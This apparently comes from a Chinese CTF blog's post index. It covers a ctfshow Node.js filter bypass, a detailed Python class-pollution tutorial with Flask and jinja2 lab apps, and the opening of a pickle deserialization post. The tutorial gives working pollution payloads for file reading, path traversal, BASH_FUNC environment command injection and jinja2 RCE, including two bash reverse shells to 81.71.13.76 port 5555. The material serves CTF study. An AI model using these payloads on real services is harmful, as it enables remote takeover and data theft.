1?query={&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true} 但是题目过滤了逗号 1?query={&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true} nodejs中会把这三部分拼接起来，为什么把ctfshow中的c编码呢，因为双引号的url编码是%22再和c连接起来就是%22c，会匹配到正则表达式。","link":"/2024/02/01/ctfshow(nodejs)/"},{"title":"python原型污染","text":"前言本文大部分参考：Article_kelp； 本人更具Article_kelp师傅的博客所给的实验文件在本地测试了一遍；其中省略了一些原理，也加入自己一点点想法; 如果之前了解SSTI漏洞和js原型污染的话，也许学起来会轻松点； 代码展示合并函数就像Javascript的原型链污染一样，同样需要一个数值合并函数将特定值污染到类的属性当中，一个标准示例如下 1234567891011def merge(src, dst): for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) hasattr() 函数用于判断对象是否包含对应的属性; getattr() 函数用于返回一个对象属性值。 setattr() 函数对应函数 getattr()，用于设置属性值，该属性不一定是存在的 污染示例由于Python中的类会继承父类中的属性，而类中声明（并不是实例中声明）的属性是唯一的，所以我们的目标就是这些在多个类、示例中仍然指向唯一的属性，如类中自定义属性及以__开头的内置属性等 123456789101112131415161718192021222324252627282930313233343536class father: secret = &quot;haha&quot;class son_a(father): passclass son_b(father): passdef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)instance = son_b()payload = { &quot;__class__&quot; : { &quot;__base__&quot; : { &quot;secret&quot; : &quot;no way&quot; } }}print(son_a.secret) #hahaprint(instance.secret) #hahamerge(payload, instance)print(son_a.secret) #no wayprint(instance.secret) #no way 不妨花点时间看看这段代码是怎么通过merge函数污染的； 12345678910111213141516171819def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) #第一次mergek为&quot;__class__&quot;;v为{'__base__': {'secret': 'no way'}};instance并没有'__getitem__'属性，跳到第一个elif;if判断为真，进入递归merge函数;参数分别是&lt;class '__main__.son_b'&gt;和{'__base__': {'secret': 'no way'}}#第二次merge此时k为&quot;__base__&quot;;v为{'secret': 'no way'};第一个if仍旧为假；跳到第一个elif;if判断为真，进入递归merge函数;参数分别是&lt;class '__main__.father'&gt;和{'secret': 'no way'}#第三次merge此时k为secret；v为no way;第一个if仍旧为假；跳到第一个elif;由于不是字典，所以第一个elif为假；执行setattr函数，此时dst就是为形参&lt;class '__main__.father'&gt;；k为secret;v为no way；至此污染成功 修改内置属性也是类似： 12345678910111213141516171819202122232425262728293031323334class father: passclass son_a(father): passclass son_b(father): passdef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)instance = son_b()payload = { &quot;__class__&quot; : { &quot;__base__&quot; : { &quot;__str__&quot; : &quot;Polluted ~&quot; } }}print(father.__str__) #&lt;slot wrapper '__str__' of 'object' objects&gt;merge(payload, instance)print(father.__str__) #Polluted ~ 无法污染的Object正如前面所述，并不是所有的类的属性都可以被污染，如Object的属性就无法被污染，所以需要目标类能够被切入点类或对象可以通过属性值查找获取到 1234567891011121314151617181920def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)payload = { &quot;__class__&quot; : { &quot;__str__&quot; : &quot;Polluted ~&quot; } }merge(payload, object) #TypeError: can't set attributes of built-in/extension type 'object' 利用在代码展示部分所给出的例子中，污染类属性是通过示例的__base__属性查找到其继承的父类，但是如果目标类与切入点类或实例没有继承关系时，这种方法就显得十分无力 全局变量获取在Python中，函数或类方法（对于类的内置方法如__init__这些来说，内置方法在并未重写时其数据类型为装饰器即wrapper_descriptor，只有在重写后才是函数function）均具有一个__globals__属性，该属性将函数或类方法所申明的变量空间中的全局变量以字典的形式返回（相当于这个变量空间中的globals函数的返回值 1234567891011secret_var = 114def test(): passclass a: def __init__(self): passprint(test.__globals__ == globals() == a.__init__.__globals__) #Trueprint(test.__globals__)#{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': &lt;_frozen_importlib_external.SourceFileLoader object at 0x00000163B99A4760&gt;, '__spec__': None, '__annotations__': {}, '__builtins__': &lt;module 'builtins' (built-in)&gt;, '__file__': 'D:\\\\Project\\\\ctf\\\\test2.py', '__cached__': None, 'secret_var': 114, 'test': &lt;function test at 0x00000163B999F040&gt;, 'a': &lt;class '__main__.a'&gt;} 所以我们可以使用__globlasl__来获取到全局变量，这样就可以修改无继承关系的类属性甚至全局变量; 123456789101112131415161718192021222324252627282930313233343536373839404142434445secret_var = 114def test(): passclass a: secret_class_var = &quot;secret&quot; def __init__(self): self.name= &quot;zixyd&quot;class b: def __init__(self): passdef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)instance = b()payload = { &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;secret_var&quot; : 514, &quot;a&quot; : { &quot;secret_class_var&quot; : &quot;Pooooluted ~&quot; } } } }print(a.secret_class_var) #secretprint(secret_var) #114merge(payload, instance)print(a.secret_class_var) #Pooooluted ~print(secret_var) #514 我想尝试修改self.name的值，但是没有成功； 已加载模块获取局限于当前模块的全局变量获取显然不够，很多情况下需要对并不是定义在入口文件中的类对象或者属性，而我们的操作位置又在入口文件中，这个时候就需要对其他加载过的模块来获取了 加载关系简单在加载关系简单的情况下，我们可以直接从文件的import语法部分找到目标模块，这个时候我们就可以通过获取全局变量来得到目标模块 123456789101112131415161718192021222324252627282930313233343536373839404142#test.pyimport test_1class cls: def __init__(self): passdef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)instance = cls()payload = { &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;test_1&quot; : { &quot;secret_var&quot; : 514, &quot;target_class&quot; : { &quot;secret_class_var&quot; : &quot;Poluuuuuuted ~&quot; } } } }}print(test_1.secret_var) #secretprint(test_1.target_class.secret_class_var) #114merge(payload, instance) print(test_1.secret_var) ##514print(test_1.target_class.secret_class_var) #Poluuuuuuted ~ 123456#test_1.pysecret_var = 114class target_class: secret_class_var = &quot;secret&quot; 加载关系复杂如CTF题目等实际环境中往往是多层模块导入，甚至是存在于内置模块或三方模块中导入，这个时候通过直接看代码文件中import语法查找就十分困难，而解决方法则是利用sys模块 sys模块的modules属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块 123456789101112131415161718192021222324252627282930313233343536373839404142434445#test.pyimport test_1import sysclass cls: def __init__(self): passdef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)instance = cls()payload = { &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;sys&quot; : { &quot;modules&quot; : { &quot;test_1&quot; : { &quot;secret_var&quot; : 514, &quot;target_class&quot; : { &quot;secret_class_var&quot; : &quot;Poluuuuuuted ~&quot; } } } } } }}print(test_1.secret_var) #secretprint(test_1.target_class.secret_class_var) #114merge(payload, instance)print(test_1.secret_var) #514print(test_1.target_class.secret_class_var) #Poluuuuuuted ~ 123456#test_1.pysecret_var = 114class target_class: secret_class_var = &quot;secret&quot; 当然我们去使用的Payload绝大部分情况下是不会这样的，如上的Payload实际上是在已经import sys的情况下使用的，而大部分情况是没有直接导入的，这样问题就从寻找import特定模块的语句转换为寻找import了sys模块的语句，对问题解决的并不见得有多少优化 加载关系复杂-实际使用如果没有导入sys，可以利用别的模块得到sys模块；直接采用&lt;模块名&gt;.__spec__.__init__.__globals__['sys']获取到sys模块； 主要是通过加载器loader；loader就是为实现模块加载而设计的类，其在importlib这一内置模块中有具体实现。令人庆幸的是importlib模块下所有的py文件中均引入了sys模块 123456789101112131415161718print(&quot;sys&quot; in dir(__import__(&quot;importlib.__init__&quot;)))#Trueprint(&quot;sys&quot; in dir(__import__(&quot;importlib._bootstrap&quot;)))#Trueprint(&quot;sys&quot; in dir(__import__(&quot;importlib._bootstrap_external&quot;)))#Trueprint(&quot;sys&quot; in dir(__import__(&quot;importlib._common&quot;)))#Trueprint(&quot;sys&quot; in dir(__import__(&quot;importlib.abc&quot;)))#Trueprint(&quot;sys&quot; in dir(__import__(&quot;importlib.machinery&quot;)))#Trueprint(&quot;sys&quot; in dir(__import__(&quot;importlib.metadata&quot;)))#Trueprint(&quot;sys&quot; in dir(__import__(&quot;importlib.resources&quot;)))#Trueprint(&quot;sys&quot; in dir(__import__(&quot;importlib.util&quot;)))#True __spec__内置属性在Python 3.4版本引入，其包含了关于类加载时的信息，本身是定义在Lib/importlib/_bootstrap.py的类ModuleSpec，显然因为定义在importlib模块下的py文件，所以可以直接采用&lt;模块名&gt;.__spec__.__init__.__globals__['sys']获取到sys模块， 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#test.pyimport test_1# import sysimport requestsclass cls: def __init__(self): passdef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)instance = cls()payload = { &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;requests&quot;:{ &quot;__spec__&quot;:{ &quot;__init__&quot;:{ &quot;__globals__&quot;:{ &quot;sys&quot;: { &quot;modules&quot; : { &quot;test_1&quot; : { &quot;secret_var&quot; : 514, &quot;target_class&quot; : { &quot;secret_class_var&quot; : &quot;Poluuuuuuted ~&quot; } } } } } } } } } }}print(test_1.secret_var) #secretprint(test_1.target_class.secret_class_var) #114merge(payload, instance)print(test_1.secret_var) #514print(test_1.target_class.secret_class_var) #Poluuuuuuted ~ 123456#test_1.pysecret_var = 114class target_class: secret_class_var = &quot;secret&quot; 或者下面这种方式也可以 12345class a: def __init__(self): passprint(a.__init__.__globals__['__loader__'].__init__.__globals__['sys']) #&lt;module 'sys' (built-in)&gt; 12345678910111213141516171819202122payload = { &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;__loader__&quot;: { &quot;__init__&quot;: { &quot;__globals__&quot;： { &quot;sys&quot;: { &quot;modules&quot; : { &quot;test_1&quot; : { &quot;secret_var&quot; : 514, &quot;target_class&quot; : { &quot;secret_class_var&quot; : &quot;Poluuuuuuted ~&quot; } } } } } } } } }} 攻击面扩展函数形参默认值替换主要用到了函数的__defaults__和__kwdefaults__这两个内置属性 __defaults____defaults__以元组的形式按从左到右的顺序收录了函数的位置或键值形参的默认值，需要注意这个位置或键值形参是特定的一类形参，并不是位置形参+键值形参，关于函数的参数分类可以参考这篇文章：python函数的位置参数(Positional)和关键字参数(keyword) - 知乎 (zhihu.com) 从代码上来看，则是如下的效果： 12345678910111213141516def func_a(var_1, var_2 =2, var_3 = 3): passdef func_b(var_1, /, var_2 =2, var_3 = 3): passdef func_c(var_1, var_2 =2, *, var_3 = 3): passdef func_d(var_1, /, var_2 =2, *, var_3 = 3): passprint(func_a.__defaults__) #(2, 3)print(func_b.__defaults__) #(2, 3)print(func_c.__defaults__) #(2,)print(func_d.__defaults__) #(2,) 通过替换该属性便能实现对函数位置或键值形参的默认值替换，但稍有问题的是该属性值要求为元组类型，而通常的如JSON等格式并没有元组这一数据类型设计概念，这就需要环境中有合适的解析输入的方式 123456789101112131415161718192021222324252627282930313233343536373839404142def evilFunc(arg_1 , shell = False): if not shell: print(arg_1) else: print(__import__(&quot;os&quot;).popen(arg_1).read())class cls: def __init__(self): passdef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)instance = cls()payload = { &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;evilFunc&quot; : { &quot;__defaults__&quot; : ( True , ) } } }}evilFunc(&quot;whoami&quot;)#whoamimerge(payload, instance)evilFunc(&quot;whoami&quot;)#article-kelp __kwdefaults____kwdefaults__以字典的形式按从左到右的顺序收录了函数键值形参的默认值，从代码上来看，则是如下的效果： 1234567891011121314151617181920def func_a(var_1, var_2 =2, var_3 = 3): passdef func_b(var_1, /, var_2 =2, var_3 = 3): passdef func_c(var_1, var_2 =2, *, var_3 = 3): passdef func_d(var_1, /, var_2 =2, *, var_3 = 3): passprint(func_a.__kwdefaults__)#Noneprint(func_b.__kwdefaults__)#Noneprint(func_c.__kwdefaults__)#{'var_3': 3}print(func_d.__kwdefaults__)#{'var_3': 3} 通过替换该属性便能实现对函数键值形参的默认值替换 12345678910111213141516171819202122232425262728293031323334353637383940def evilFunc(arg_1 , * , shell = False): if not shell: print(arg_1) else: print(__import__(&quot;os&quot;).popen(arg_1).read())class cls: def __init__(self): passdef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)instance = cls()payload = { &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;evilFunc&quot; : { &quot;__kwdefaults__&quot; : { &quot;shell&quot; : True } } } }}evilFunc(&quot;whoami&quot;) #whoamimerge(payload, instance)evilFunc(&quot;whoami&quot;) #article-kelp 特定值替换__file__DSACTF2023七月暑期赛–EzFlask中存在下面这段代码， 123@app.route('/',methods=['GET']) def index(): return open(__file__, &quot;r&quot;).read() 其中存在merge函数；__init__等被过滤；使用unioncode进行绕过，注意：__file__是__globals__下的一个属性，表示当前文件路径；如果可以修改__file__；那么我们就可以读取任意文件 123456def test(): passprint(test.__globals__['__file__']) #D:\\Project\\ctf\\test3.pytest.__globals__['__file__'] = &quot;/flag&quot;print(test.__globals__['__file__']) #/flag os.environ[]如果可以得到os模块，并且存在原型污染；那么可以通过os.environ往环境变量注入值； 123import osos.environ['test'] = &quot;TEST&quot;print(os.environ['test']) #TEST 那么可以利用环境变量注入执行任意命令；具体环境变量注入原理还是看p神博客； 1234import subprocessimport osos.environ['BASH_FUNC_echo%%']='() { id; }'subprocess.run('echo &quot;aaa&quot;', shell=True, executable='/bin/bash') 12345import osos.environ[&quot;BASH_FUNC_echo%%&quot;] = '() { id; }'os.system(&quot;/bin/bash -c 'echo \\&quot;aaa\\&quot;'&quot;) 这里需要注意一些环境原因，比如服务器操作系统,操作系统的版本号；还有一些玄学，我用os.system在我的kali机没有成功，但是subprocess.run样式成功了，而且我用kali开个docker，在docker中运行os.system样式也可以成功 12env $'BASH_FUNC_echo%%=() { id; }' bash -c 'echo hello' env $'BASH_FUNC_echo()=() { id; }' bash -c &quot;echo hello&quot; 类似如下： 1234567891011121314151617181920212223242526272829303132333435363738394041import osdef test(): passclass a: def __init__(self): passdef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: print(dst) setattr(dst, k, v)instance = a()payload = { &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;os&quot;:{ &quot;environ&quot;:{ &quot;BASH_FUNC_echo%%&quot;:&quot;() { /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/81.71.13.76/5555 0&gt;&amp;1'; }&quot; } } } } }merge(payload,instance)os.system(&quot;/bin/bash -c 'echo \\&quot;aaa\\&quot;'&quot;) flask相关特定属性SECRET_KEY决定flask的session生成的重要参数，知道该参数可以实现session任意伪造 给出示范环境如下： 12345678910111213141516171819202122232425262728293031323334#app.pyfrom flask import Flask,requestimport jsonapp = Flask(__name__)def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)class cls(): def __init__(self): passinstance = cls()@app.route('/',methods=['POST', 'GET'])def index(): if request.data: merge(json.loads(request.data), instance) return &quot;[+]Config:%s&quot;%(app.config['SECRET_KEY']) app.run(host=&quot;0.0.0.0&quot;) 正常访问 使用如下的Payload： 1234567891011{ &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;app&quot; : { &quot;config&quot; : { &quot;SECRET_KEY&quot; :&quot;Polluted~&quot; } } } }} _got_first_request用于判定是否某次请求为自Flask启动后第一次请求，是Flask.got_first_request函数的返回值，此外还会影响装饰器app.before_first_request的调用，依据源码可以知道_got_first_request值为假时才会调用： 给出示范环境如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344from flask import Flask,requestimport jsonapp = Flask(__name__)def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)class cls(): def __init__(self): passinstance = cls()flag = &quot;Is flag here?&quot;@app.before_first_requestdef init(): global flag if hasattr(app, &quot;special&quot;) and app.special == &quot;U_Polluted_It&quot;: flag = open(&quot;flag&quot;, &quot;rt&quot;).read()@app.route('/',methods=['POST', 'GET'])def index(): if request.data: merge(json.loads(request.data), instance) global flag setattr(app, &quot;special&quot;, &quot;U_Polluted_It&quot;) return flagapp.run(host=&quot;0.0.0.0&quot;)#flagflag{U_Find_Me} before_first_request修饰的init函数只会在第一次访问前被调用，而其中读取flag的逻辑又需要访问路由/后才能触发，这就构成了矛盾。所以需要使用payload在访问/后重置_got_first_request属性值为假，这样before_first_request才会再次调用。 payload 123456789{ &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;app&quot;:{ &quot;_got_first_request&quot;:false } } }} _static_url_path这个属性中存放的是flask中静态目录的值，默认该值为static。访问flask下的资源可以采用如http://domain/static/xxx，这样实际上就相当于访问_static_url_path目录下xxx的文件并将该文件内容作为响应内容返回 1234567#static/index.html&lt;html&gt;&lt;h1&gt;hello&lt;/h1&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt; 123456789101112131415161718192021222324252627282930313233#app.pyfrom flask import Flask,requestimport jsonapp = Flask(__name__)def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)class cls(): def __init__(self): passinstance = cls()@app.route('/',methods=['POST', 'GET'])def index(): if request.data: merge(json.loads(request.data), instance) return &quot;flag in ./flag but heres only static/index.html&quot;app.run(host=&quot;0.0.0.0&quot;) 123#flagflag{U_Find_Me} 此时http://domain/static/xxx只能访问到文件系统当前目录下static目录中的xxx文件，并且不存在如目录穿越的漏洞 污染该属性为当前目录。这样就能访问到当前目录下的flag文件了 123456789{ &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;app&quot;:{ &quot;_static_url_path&quot;:&quot;./&quot; } } }} os.path.pardir这个os模块下的变量会影响flask的模板渲染函数render_template的解析，所以也收录在flask部分，模拟的环境如下： 1234567#templates/index.html&lt;html&gt;&lt;h1&gt;hello&lt;/h1&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt; 1234567891011121314151617181920212223242526272829303132333435363738394041#app.pyfrom flask import Flask,request,render_templateimport jsonimport osapp = Flask(__name__)def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)class cls(): def __init__(self): passinstance = cls()@app.route('/',methods=['POST', 'GET'])def index(): if request.data: merge(json.loads(request.data), instance) return &quot;flag in ./flag but u just can use /file to vist ./templates/file &quot;+os.path.pardir@app.route(&quot;/&lt;path:path&gt;&quot;)def render_page(path): if not os.path.exists(&quot;templates/&quot; + path): return &quot;templates/&quot; + path+&quot; not found&quot;, 404 return render_template(path)app.run(host=&quot;0.0.0.0&quot;) 123#flagflag{U_Find_Me} 直接访问http://domain/xxx时会使用render_tempaltes渲染templates/xxx文件 如果尝试目录穿越则会导致render_template函数报错 os.path.pardir值默认即为..，所以只要修改该属性为任意其他值即可避免报错，从而实现render_template函数的目录穿越 1234567891011{ &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;os&quot;:{ &quot;path&quot;:{ &quot;pardir&quot;:&quot;!&quot; } } } }} 记得修改 1Content-Type: application/json 模板编译时的变量在flask中如使用render_template渲染一个模板实际上经历了多个阶段的处理，其中一个阶段是对模板中的Jinja语法进行解析转化为AST，而在语法树的根部即Lib/site-packages/jinja2/compiler.py中CodeGenerator类的visit_Template方法纯在一段有趣的逻辑 该逻辑会向输出流写入一段拼接的代码（输出流中代码最终会被编译进而执行），注意其中的exported_names变量，该变量为.runtime模块（即Lib/site-packages/jinja2/runtime.py）中导入的变量exported和async_exported组合后得到，这就意味着我们可以通过污染.runtime模块中这两个变量实现RCE。由于这段逻辑是模板文件解析过程中必经的步骤之一，所以这就意味着只要渲染任意的文件均能通过污染这两属性实现RCE。 给出模拟的环境如下： 1234567#templates/index.html&lt;html&gt;&lt;h1&gt;nt here~&lt;/h1&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425262728293031323334#app.pyfrom flask import Flask,request,render_templateimport jsonapp = Flask(__name__)def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)class cls(): def __init__(self): passinstance = cls()@app.route('/',methods=['POST', 'GET'])def index(): if request.data: merge(json.loads(request.data), instance) return render_template(&quot;index.html&quot;)app.run(host=&quot;0.0.0.0&quot;) 12#static/#是个空目录,方便直接利用static目录读取flag 123#flagflag{U_Find_Me} 但是需要注意插入payload的位置是AST的根部分，是作为模板编译时的处理代码的一部分，同样受到模板缓存的影响，也就是说这里插入的payload只会在模板在第一次访问时触发 payload 记得修改如下，因为源码中用了json.loads函数 1Content-Type: application/json 赋值flag到static目录下 1234567891011121314151617181920212223{ &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;__loader__&quot;: { &quot;__init__&quot;: { &quot;__globals__&quot;:{ &quot;sys&quot;: { &quot;modules&quot; : { &quot;jinja2&quot; : { &quot;runtime&quot; : { &quot;exported&quot;: [ &quot;*;__import__('os').system('cp ./flag ./static/flag');#&quot; ] } } } } } } } } }} 在出网的情况下，直接反弹shell 1234567891011121314151617181920212223{ &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;__loader__&quot;: { &quot;__init__&quot;: { &quot;__globals__&quot;:{ &quot;sys&quot;: { &quot;modules&quot; : { &quot;jinja2&quot; : { &quot;runtime&quot; : { &quot;exported&quot;: [ &quot;*;__import__('os').system('/bin/bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/81.71.13.76/5555 0&gt;&amp;1\\&quot;');#&quot; ] } } } } } } } } }} 反弹成功 Pydash依据原博主所述，目前发现了Pydash模块中的set_和set_with函数具有如上实例中merge函数类似的类属性赋值逻辑，能够实现污染攻击。idekctf 2022*中的task manager这题就设计使用该函数提供可以污染的环境 123456from pydash import set_data = {'a': {'b': {'c': 3}}}set_(data, 'a.b.c', 4)print(data) # 输出 {'a': {'b': {'c': 4}}} set_12345678910111213141516171819202122232425from pydash import set_class father: secret = &quot;haha&quot;class son_a(father): passclass son_b(father): passinstance = son_b()payload = { &quot;__class__&quot; : { &quot;__base__&quot; : { &quot;secret&quot; : &quot;no way&quot; } }}print(son_a.secret) #hahaprint(instance.secret) #hahaset_(instance,&quot;__class__.__base__.secret&quot;,&quot;no way&quot;)print(son_a.secret) #no wayprint(instance.secret) #no way set_with12345678910111213141516171819202122232425from pydash import set_withclass father: secret = &quot;haha&quot;class son_a(father): passclass son_b(father): passinstance = son_b()payload = { &quot;__class__&quot; : { &quot;__base__&quot; : { &quot;secret&quot; : &quot;no way&quot; } }}print(son_a.secret) #hahaprint(instance.secret) #hahaset_with(instance,&quot;__class__.__base__.secret&quot;,&quot;no way&quot;)print(son_a.secret) #no wayprint(instance.secret) #no way","link":"/2024/02/03/python%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93/"},{"title":"python反序列化","text":"前言学习python反序列化漏洞；总结了一些大佬的博客；所以本文大部分内容都来自参考博客； 本文参考：pickle反序列化初探,python pickle 反序列化总结,python反序列化漏洞 pickle简介 与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。 python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。 与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示？自定义类型。 pickle实际上可以看作一种独立的语言，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。 object.__reduce__() 函数 在开发时，可以通过重写类的 object.__reduce__() 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 object.__reduce__() 返回一个 (callable, ([para1,para2...])[,...]) 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。 在下文pickle的opcode中， R 的作用与 object.__reduce__() 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 R 正好对应 object.__reduce__() 函数， object.__reduce__() 的返回值会作为 R 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 R 的。 opcode简介opcode版本pickle由于有不同的实现版本，在py3和py2中得到的opcode不相同。但是pickle可以向下兼容（所以用v0就可以在所有版本中执行）。目前，pickle有6种版本。 12345678910111213141516# coding=utf-8import picklea={'1': 1, '2': 2}print(f'# 原变量：{a!r}')for i in range(6): print(f'pickle版本{i}',pickle.dumps(a,protocol=i)) # 原变量：{'1': 1, '2': 2}# pickle版本0 b'(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.'# pickle版本1 b'}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.'# pickle版本2 b'\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.'# pickle版本3 b'\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.'# pickle版本4 b'\\x80\\x04\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.'# pickle版本5 b'\\x80\\x05\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.' 这里有个小技巧，如果题目过滤了\\n;在pickle版本4以上没有\\n pickletools使用pickletools可以方便的将opcode转化为便于肉眼读取的形式。 12345678910111213141516171819202122232425262728293031import pickleimport pickletoolsclass test: def __init__(self): self.people = 'lituer'a = test()serialized = pickle.dumps(a, protocol=3) # 指定PVM 协议版本print(serialized)unserialized = pickle.loads(serialized) # 注意，loads 能够自动识别反序列化的版本print(unserialized.people)pickletools.dis(serialized)# b'\\x80\\x03c__main__\\ntest\\nq\\x00)\\x81q\\x01}q\\x02X\\x06\\x00\\x00\\x00peopleq\\x03X\\x06\\x00\\x00\\x00lituerq\\x04sb.'# lituer# 0: \\x80 PROTO 3# 2: c GLOBAL '__main__ test'# 17: q BINPUT 0# 19: ) EMPTY_TUPLE# 20: \\x81 NEWOBJ# 21: q BINPUT 1# 23: } EMPTY_DICT# 24: q BINPUT 2# 26: X BINUNICODE 'people'# 37: q BINPUT 3# 39: X BINUNICODE 'lituer'# 50: q BINPUT 4# 52: s SETITEM# 53: b BUILD# 54: . STOP# highest protocol among opcodes = 2 可读性较强;想要弄懂这个回显的具体内容，我们还要弄得一个东西，PVM PVM我们在使用pickler的时候，我们要序列化的内容，必须经过PVM，Pickle Virtual Machine 